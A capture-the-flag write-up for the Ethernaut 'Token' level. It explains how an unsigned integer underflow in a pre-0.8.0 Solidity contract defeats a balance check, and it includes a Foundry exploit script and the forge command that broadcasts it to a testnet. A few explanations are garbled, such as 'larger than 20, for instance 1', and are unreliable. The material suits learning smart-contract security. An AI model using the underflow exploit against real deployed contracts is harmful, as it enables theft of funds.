## 👾 05. Token

<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/b4985e6e-fbb2-4e7c-ac7b-2e249f857bb4">
</p>


<br>


### tl; dr

<br>


* in this challenge, we explore a classic vulnerability in both web2 and web3 security: **integer overflows**.


<br>


```solidity
contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```


<br>

---

### discussion

<br>

 * programming languages that are not memory-managed can have their integer variables overflown if assigned to values larger than the variables' capacity limit.
    - we will use this trick to overflow a `uint` and bypass the `require()` check of `Token()`'s `transfer()` function:

<br>

```solidity
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

<br>

 * whenever we add `1` to a variable's maximum value, the value wraps around and decreases.
    - for example, an (unsigned) `uint8`, has the maximum value of `2^8 - 1 = 255`. if we add `1` to it, it becomes `0`. same as `2^256 - 1 + 1`.
    - symmetrically, if we subtract a value larger than what the variable holds, the result wraps around from the other side, increasing the variable's value. this is our exploit.

<br>

* if we pass a `_value` to `transfer()` that is larger than `20`, for instance `1`, `balances[msg.sender] - _value` results on `uint256(-1)`, which is equal to a very large number, `2^256 – 1`.


<br>

* **[in solidity, this type of integer overflow used to be a vulnerability until version `0.8.0`](https://solidity-by-example.org/hacks/overflow/)**.
    - this is why contracts were advised to use **[OpenZeppelin' `SafeMath.sol`](https://docs.openzeppelin.com/contracts/4.x/utilities#math
)** whenever they performed integer operations.
    - in newer versions, if the code is not performing these operations, we can use `unchecked` to save gas.

<br>



----

### solution in solidity

<br>

* since this challenge is so easy, we skip tests and go directly to the submission script, `script/05/Token.s.sol`:

<br>

```solidity
contract Exploit is Script {
        
        address instance = vm.envAddress("INSTANCE_LEVEL5");   
        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));    
        Token level = Token(instance);     
        
        function run() external {
            vm.startBroadcast(hacker);
            level.transfer(address(0), 21);
            vm.stopBroadcast();
    }
}
```

<br>

* running with:

<br>

```shell
> forge script ./script/05/Token.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>

---

### alternative 3-lines solution directly in the console

<br>

<p align="center">
<img width="600" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/c2d2db5c-feb8-469d-91b6-5b852cc5f011">
</p>

<br>


----


### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



